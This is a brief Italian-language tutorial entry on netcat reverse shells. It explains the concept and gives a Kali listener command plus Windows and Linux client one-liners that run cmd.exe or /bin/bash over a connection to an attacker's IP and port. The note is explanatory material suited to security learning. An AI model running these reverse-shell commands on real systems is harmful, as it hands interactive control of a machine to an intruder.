
# Netcat Reverse Shell
Una reverse shell è un tipo di connessione shell che permette a un dispositivo compromesso (il target) di iniziare una connessione in uscita verso una macchina controllata dall’attaccante (l’attacker listener), fornendo così all’attaccante l’accesso interattivo al sistema target.
Per poter effettuare questo tipo di connessione possiamo usare netcat in ascolto sulla macchina attaccante per poi avviare la connessione, sempre tramite netcat, dalla macchina target verso la macchina attaccante:
```bash
#Kali linux Listener
nc -nvlp PORT
```
```bash
#Windows Client
nc -nv IP PORT -e cmd.exe

#Linux Client
nc -nv IP PORT -e /bin/bash
```
il lato negativo di questa tecnica é che il target ha bisogno del indirizzo IP del attaccante per potersi connettere 
